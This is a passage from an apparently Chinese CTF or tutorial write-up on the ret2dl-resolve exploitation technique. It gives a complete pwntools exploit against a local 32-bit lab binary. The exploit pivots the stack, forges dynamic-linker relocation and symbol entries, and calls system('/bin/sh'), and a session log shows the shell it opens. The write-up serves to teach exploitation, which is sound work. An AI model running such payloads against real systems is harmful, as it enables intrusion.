<p>根据理论知识及对二进制文件的分析，我们需要一个 read 函数用于读入后续的 payload 和伪造的各种表，一个 write 函数用于验证每一步的正确性，最后将 write 换成 system，就能得到 shell 了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./a.out&apos;)</span><br><span class="line">io = remote(&apos;127.0.0.1&apos;, 10001)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">pppr_addr      = 0x08048699     # pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">pop_ebp_addr   = 0x0804869b     # pop ebp ; ret</span><br><span class="line">leave_ret_addr = 0x080484b6     # leave ; ret</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">read_plt  = elf.plt[&apos;read&apos;]</span><br><span class="line"></span><br><span class="line">plt_0    = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addr        # 0x80483e0</span><br><span class="line">rel_plt  = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addr    # 0x8048390</span><br><span class="line">dynsym   = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addr     # 0x80481cc</span><br><span class="line">dynstr   = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr     # 0x804828c</span><br><span class="line">bss_addr = elf.get_section_by_name(&apos;.bss&apos;).header.sh_addr        # 0x804a028</span><br><span class="line"></span><br><span class="line">base_addr = bss_addr + 0x600    # 0x804a628</span><br></pre></td></tr></table></figure>
<p>分别获取伪造各种表所需要的段地址，将 bss 段的地址加上 0x600 作为伪造数据的基地址，这里可能需要根据实际情况稍加修改。gadget pppr 用于平衡栈， pop ebp 和 leave ret 配合，以达到将 esp 指向 base_addr 的目的（在章节3.3.4中有讲到）。</p>
<p>第一部分的 payload 如下所示，首先从标准输入读取 100 字节到 base_addr，将 esp 指向它，并跳转过去，执行 base_addr 处的 payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload_1  = &quot;A&quot; * 112</span><br><span class="line">payload_1 += p32(read_plt)</span><br><span class="line">payload_1 += p32(pppr_addr)</span><br><span class="line">payload_1 += p32(0)</span><br><span class="line">payload_1 += p32(base_addr)</span><br><span class="line">payload_1 += p32(100)</span><br><span class="line">payload_1 += p32(pop_ebp_addr)</span><br><span class="line">payload_1 += p32(base_addr)</span><br><span class="line">payload_1 += p32(leave_ret_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload_1)</span><br></pre></td></tr></table></figure>
<p>从这里开始，后面的 paylaod 都是通过 read 函数读入的，所以必须为 100 字节长。首先，调用 write@plt 函数打印出与 base_addr 偏移 80 字节处的字符串 “/bin/sh”，以验证栈转移成功。注意由于 <code>.dynstr</code> 中的字符串都是以 <code>\x00</code> 结尾的，所以伪造字符串为 <code>bin/sh\x00</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload_2  = &quot;AAAA&quot;     # new ebp</span><br><span class="line">payload_2 += p32(write_plt)</span><br><span class="line">payload_2 += &quot;AAAA&quot;</span><br><span class="line">payload_2 += p32(1)</span><br><span class="line">payload_2 += p32(base_addr + 80)</span><br><span class="line">payload_2 += p32(len(&quot;/bin/sh&quot;))</span><br><span class="line">payload_2 += &quot;A&quot; * (80 - len(payload_2))</span><br><span class="line">payload_2 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload_2 += &quot;A&quot; * (100 - len(payload_2))</span><br><span class="line"></span><br><span class="line">io.sendline(payload_2)</span><br><span class="line">print io.recv()</span><br></pre></td></tr></table></figure>
<p>我们知道第一次调用 write@plt 时其实是先将 reloc_index 压入栈，然后跳转到 PLT[0]：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble write</span><br><span class="line">Dump of assembler code for function write@plt:</span><br><span class="line">   0x08048430 &lt;+0&gt;:     jmp    DWORD PTR ds:0x804a01c</span><br><span class="line">   0x08048436 &lt;+6&gt;:     push   0x20</span><br><span class="line">   0x0804843b &lt;+11&gt;:    jmp    0x80483e0</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
<p>这次我们跳过这个过程，直接控制 <code>eip</code> 跳转到 PLT[0]，并在栈上布置上 reloc_index，即 <code>0x20</code>，就像是调用了 write@plt 一样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">reloc_index = 0x20</span><br><span class="line"></span><br><span class="line">payload_3  = &quot;AAAA&quot;</span><br><span class="line">payload_3 += p32(plt_0)</span><br><span class="line">payload_3 += p32(reloc_index)</span><br><span class="line">payload_3 += &quot;AAAA&quot;</span><br><span class="line">payload_3 += p32(1)</span><br><span class="line">payload_3 += p32(base_addr + 80)</span><br><span class="line">payload_3 += p32(len(&quot;/bin/sh&quot;))</span><br><span class="line">payload_3 += &quot;A&quot; * (80 - len(payload_3))</span><br><span class="line">payload_3 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload_3 += &quot;A&quot; * (100 - len(payload_3))</span><br><span class="line"></span><br><span class="line">io.sendline(payload_3)</span><br><span class="line">print io.recv()</span><br></pre></td></tr></table></figure>
<p>接下来，我们更进一步，伪造一个 write 函数的 Elf32_Rel 结构体，原结构体在 <code>.rel.plt</code> 中，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset;       /* Address */</span><br><span class="line">  Elf32_Word    r_info;         /* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r a.out | grep write</span><br><span class="line">0804a01c  00000707 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>
<p>该结构体的 <code>r_offset</code> 是 write@got 地址，即 <code>0x0804a01c</code>，<code>r_info</code> 是 <code>0x707</code>。动态装载器通过 reloc_index 找到它，而 reloc_index 是相对于 <code>.rel.plt</code> 的偏移，所以我们如果控制了这个偏移，就可以跳转到伪造的 write 上。payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">reloc_index = base_addr + 28 - rel_plt  # fake_reloc = base_addr + 28</span><br><span class="line"></span><br><span class="line">r_info = 0x707</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload_4  = &quot;AAAA&quot;</span><br><span class="line">payload_4 += p32(plt_0)</span><br><span class="line">payload_4 += p32(reloc_index)</span><br><span class="line">payload_4 += &quot;AAAA&quot;</span><br><span class="line">payload_4 += p32(1)</span><br><span class="line">payload_4 += p32(base_addr + 80)</span><br><span class="line">payload_4 += p32(len(&quot;/bin/sh&quot;))</span><br><span class="line">payload_4 += fake_reloc</span><br><span class="line">payload_4 += &quot;A&quot; * (80 - len(payload_4))</span><br><span class="line">payload_4 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload_4 += &quot;A&quot; * (100 - len(payload_4))</span><br><span class="line"></span><br><span class="line">io.sendline(payload_4)</span><br><span class="line">print io.recv()</span><br></pre></td></tr></table></figure>
<p>另外讲一讲 Elf32_Rel 值的计算方法如下，我们下面会得用到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define ELF32_R_SYM(val)        ((val) &gt;&gt; 8)</span><br><span class="line">#define ELF32_R_TYPE(val)       ((val) &amp; 0xff)</span><br><span class="line">#define ELF32_R_INFO(sym, type)     (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ELF32_R_SYM(0x707) = (0x707 &gt;&gt; 8) = 0x7</code>，即 <code>.dynsym</code> 的第 7 行</li>
<li><code>ELF32_R_TYPE(0x707) = (0x707 &amp; 0xff) = 0x7</code>，即 <code>#define R_386_JMP_SLOT 7 /* Create PLT entry */</code></li>
<li><code>ELF32_R_INFO(0x7, 0x7) = (((0x7 &lt;&lt; 8) + ((0x7) &amp; 0xff)) = 0x707</code>，即 r_info</li>
</ul>
<p>这一次，伪造位于 <code>.dynsym</code> 段的结构体 Elf32_Sym，原结构体如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;        /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;       /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;        /* Symbol size */</span><br><span class="line">  unsigned char st_info;        /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;       /* Symbol visibility */</span><br><span class="line">  Elf32_Section st_shndx;       /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s a.out | grep write</span><br><span class="line">     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND write@GLIBC_2.0 (2)</span><br></pre></td></tr></table></figure>
<p>转储 <code>.dynsym</code> 段并找到第 7 行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s -j .dynsym a.out </span><br><span class="line">...</span><br><span class="line"> 804823c 4c000000 00000000 00000000 12000000  L...............</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>其中最重要的是 <code>st_name</code> 和 <code>st_info</code>，分别为 <code>0x4c</code> 和 <code>0x12</code>。构造 payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">reloc_index = base_addr + 28 - rel_plt</span><br><span class="line">fake_sym_addr = base_addr + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # since the size of Elf32_Sym is 0x10</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"></span><br><span class="line">r_sym = (fake_sym_addr - dynsym) / 0x10  # calcute the symbol index since the size of Elf32_Sym</span><br><span class="line">r_type = 0x7    # R_386_JMP_SLOT -&gt; Create PLT entry</span><br><span class="line">r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff) # ELF32_R_INFO(sym, type) = (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">st_name = 0x4c</span><br><span class="line">st_info = 0x12</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)</span><br><span class="line"></span><br><span class="line">payload_5  = &quot;AAAA&quot;</span><br><span class="line">payload_5 += p32(plt_0)</span><br><span class="line">payload_5 += p32(reloc_index)</span><br><span class="line">payload_5 += &quot;AAAA&quot;</span><br><span class="line">payload_5 += p32(1)</span><br><span class="line">payload_5 += p32(base_addr + 80)</span><br><span class="line">payload_5 += p32(len(&quot;/bin/sh&quot;))</span><br><span class="line">payload_5 += fake_reloc</span><br><span class="line">payload_5 += &quot;A&quot; * align</span><br><span class="line">payload_5 += fake_sym</span><br><span class="line">payload_5 += &quot;A&quot; * (80 - len(payload_5))</span><br><span class="line">payload_5 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload_5 += &quot;A&quot; * (100 - len(payload_5))</span><br><span class="line"></span><br><span class="line">io.sendline(payload_5)</span><br><span class="line">print io.recv()</span><br></pre></td></tr></table></figure>
<p>一样地讲一下 st_info 的解析和插入算法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define ELF32_ST_BIND(val)      (((unsigned char) (val)) &gt;&gt; 4)</span><br><span class="line">#define ELF32_ST_TYPE(val)      ((val) &amp; 0xf)</span><br><span class="line">#define ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span><br></pre></td></tr></table></figure>
<ul>
<li><code>ELF32_ST_BIND(0x12) = (((unsigned char) (0x12)) &gt;&gt; 4) = 0x1</code>，即 <code>#define STB_GLOBAL 1 /* Global symbol */</code></li>
<li><code>ELF32_ST_TYPE(0x12) = ((0x12) &amp; 0xf) = 0x2</code>，即 <code>#define STT_FUNC 2 /* Symbol is a code object */</code></li>
<li><code>ELF32_ST_INFO(0x1, 0x2) = (((0x1) &lt;&lt; 4) + ((0x2) &amp; 0xf)) = 0x12</code>，即 st_info</li>
</ul>
<p>下一步，是将 <code>st_name</code> 指向我们伪造的字符串 “write”，payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">reloc_index = base_addr + 28 - rel_plt</span><br><span class="line">fake_sym_addr = base_addr + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"></span><br><span class="line">r_sym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_type = 0x7</span><br><span class="line">r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff)</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr     # address of string &quot;write&quot;</span><br><span class="line">st_bind = 0x1   # STB_GLOBAL -&gt; Global symbol</span><br><span class="line">st_type = 0x2   # STT_FUNC -&gt; Symbol is a code object</span><br><span class="line">st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)  # 0x12</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)</span><br><span class="line"></span><br><span class="line">payload_6 = &quot;AAAA&quot;</span><br><span class="line">payload_6 += p32(plt_0)</span><br><span class="line">payload_6 += p32(reloc_index)</span><br><span class="line">payload_6 += &quot;AAAA&quot;</span><br><span class="line">payload_6 += p32(1)</span><br><span class="line">payload_6 += p32(base_addr + 80)</span><br><span class="line">payload_6 += p32(len(&quot;/bin/sh&quot;))</span><br><span class="line">payload_6 += fake_reloc</span><br><span class="line">payload_6 += &quot;A&quot; * align</span><br><span class="line">payload_6 += fake_sym</span><br><span class="line">payload_6 += &quot;write\x00&quot;</span><br><span class="line">payload_6 += &quot;A&quot; * (80 - len(payload_6))</span><br><span class="line">payload_6 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload_6 += &quot;A&quot; * (100 - len(payload_6))</span><br><span class="line"></span><br><span class="line">io.sendline(payload_6)</span><br><span class="line">print io.recv()</span><br></pre></td></tr></table></figure>
<p>最后，只要将 “write” 替换成任何我们希望的函数，并调整参数，就可以了，这里我们换成 “system”，拿到 shell：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">reloc_index = base_addr + 28 - rel_plt</span><br><span class="line">fake_sym_addr = base_addr + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line"></span><br><span class="line">r_sym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_type = 0x7</span><br><span class="line">r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff)</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">st_bind = 0x1</span><br><span class="line">st_type = 0x2</span><br><span class="line">st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)</span><br><span class="line"></span><br><span class="line">payload_7 = &quot;AAAA&quot;</span><br><span class="line">payload_7 += p32(plt_0)</span><br><span class="line">payload_7 += p32(reloc_index)</span><br><span class="line">payload_7 += &quot;AAAA&quot;</span><br><span class="line">payload_7 += p32(base_addr + 80)</span><br><span class="line">payload_7 += &quot;AAAA&quot;</span><br><span class="line">payload_7 += &quot;AAAA&quot;</span><br><span class="line">payload_7 += fake_reloc</span><br><span class="line">payload_7 += &quot;A&quot; * align</span><br><span class="line">payload_7 += fake_sym</span><br><span class="line">payload_7 += &quot;system\x00&quot;</span><br><span class="line">payload_7 += &quot;A&quot; * (80 - len(payload_7))</span><br><span class="line">payload_7 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload_7 += &quot;A&quot; * (100 - len(payload_7))</span><br><span class="line"></span><br><span class="line">io.sendline(payload_7)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>成功。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">parallels@parallels-vm:~/Desktop/dl_runtime_reslove$ python exp.py </span><br><span class="line">[*] &apos;/home/parallels/Desktop/dl_runtime_reslove/main&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Starting local process &apos;./main&apos;: pid 30111</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">parallels</span><br></pre></td></tr></table></figure>
<p>这题中所需要注意的一些小问题：</p>
<ol>
<li>最后调用system函数所需要的参数不能直接是’/bin/sh’字符串，需要的是指向它的指针。</li>
<li>开始第一次溢出程序的时候需要用的是read函数的plt地址，不能使用got地址。</li>
</ol>
<p>这题是 32 位程序，在 64 位下会有一些变化，比如说：</p>
<ul>
<li>64 位程序一般情况下使用寄存器传参，但给 <code>_dl_runtime_resolve</code> 传参时使用栈</li>
<li><code>_dl_runtime_resolve</code> 函数的第二个参数 <code>reloc_index</code> 由偏移变为了索引。</li>
<li><code>_dl_fixup</code> 函数中，在伪造 fake_sym 后，可能会造成崩溃，需要将 <code>link_map+0x1c8</code> 地址上的值置零</li>
</ul>
<p>如果觉得手工构造太麻烦，有一个工具 <a href="https://github.com/inaz2/roputils" target="_blank" rel="noopener">roputils</a> 可以简化此过程，自行尝试。</p>
<p>如果没有置为0的话：</p>
<p>将<code>link_map+0x1c8</code>处不设为<code>NULL</code>。再执行发现遇到segfault了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x40033c --&gt; 0x2000200020000</span><br><span class="line">RBX: 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">RCX: 0x155dc00000007</span><br><span class="line">RDX: 0x155dc</span><br><span class="line">RSI: 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">RDI: 0x4002f8 --&gt; 0x6f732e6362696c00 (&apos;&apos;)</span><br><span class="line">RBP: 0x0</span><br><span class="line">RSP: 0x600da8 --&gt; 0x0</span><br><span class="line">RIP: 0x7ffff7de9448 (&lt;_dl_fixup+120&gt;:   movzx  eax,WORD PTR [rax+rdx*2])</span><br><span class="line">R8 : 0x600f00 --&gt; 0x600efc --&gt; 0x600efc66477747</span><br><span class="line">R9 : 0x7ffff7dea4e0 (&lt;_dl_fini&gt;:        push   rbp)</span><br><span class="line">R10: 0x7ffff7ffe130 --&gt; 0x0</span><br><span class="line">R11: 0x246</span><br><span class="line">R12: 0x0</span><br><span class="line">R13: 0x0</span><br><span class="line">R14: 0x0</span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7de943b &lt;_dl_fixup+107&gt;:      test rax,rax</span><br><span class="line">   0x7ffff7de943e &lt;_dl_fixup+110&gt;:      je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;</span><br><span class="line">   0x7ffff7de9444 &lt;_dl_fixup+116&gt;:      mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">=&gt; 0x7ffff7de9448 &lt;_dl_fixup+120&gt;:      movzx  eax,WORD PTR [rax+rdx*2]</span><br><span class="line">   0x7ffff7de944c &lt;_dl_fixup+124&gt;:      and    eax,0x7fff</span><br><span class="line">   0x7ffff7de9451 &lt;_dl_fixup+129&gt;:      lea    rdx,[rax+rax*2]</span><br><span class="line">   0x7ffff7de9455 &lt;_dl_fixup+133&gt;:      mov    rax,QWORD PTR [r10+0x2e0]</span><br><span class="line">   0x7ffff7de945c &lt;_dl_fixup+140&gt;:      lea    r8,[rax+rdx*8]</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x600da8 --&gt; 0x0</span><br><span class="line">0008| 0x600db0 --&gt; 0x600f20 --&gt; 0x1200200c40</span><br><span class="line">0016| 0x600db8 --&gt; 0x0</span><br><span class="line">0024| 0x600dc0 --&gt; 0x0</span><br><span class="line">0032| 0x600dc8 --&gt; 0x0</span><br><span class="line">0040| 0x600dd0 --&gt; 0x7ffff7defd00 (&lt;_dl_runtime_resolve+80&gt;:    mov    r11,rax)</span><br><span class="line">0048| 0x600dd8 (&quot;jweM5ZXF&quot;)</span><br><span class="line">0056| 0x600de0 --&gt; 0x0</span><br><span class="line">[------------------------------------------------------------------------------]</span><br></pre></td></tr></table></figure>
<p>这其中，<code>rax=0x40033c</code>是<code>.gnu.version</code>所在。而这里还存在一处检查。查看<code>dl-runtime.c</code>文件，这部分对应的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   /* Look up the target symbol. If the normal lookup rules are not</span><br><span class="line">used don&apos;t look in the global scope. */</span><br><span class="line">  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</span><br><span class="line">    &#123;</span><br><span class="line">      const struct r_found_version *version = NULL;</span><br><span class="line"></span><br><span class="line">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      const ElfW(Half) *vernum =</span><br><span class="line">        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</span><br><span class="line">      version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">      if (version-&gt;hash == 0)</span><br><span class="line">        version = NULL;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里，应该是由于我们构造的伪symbol的index过大，使得<code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code>读取出错。为了绕过这部分，roputils选择的方法便是令<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL</code>。相关的汇编代码如下：</p>
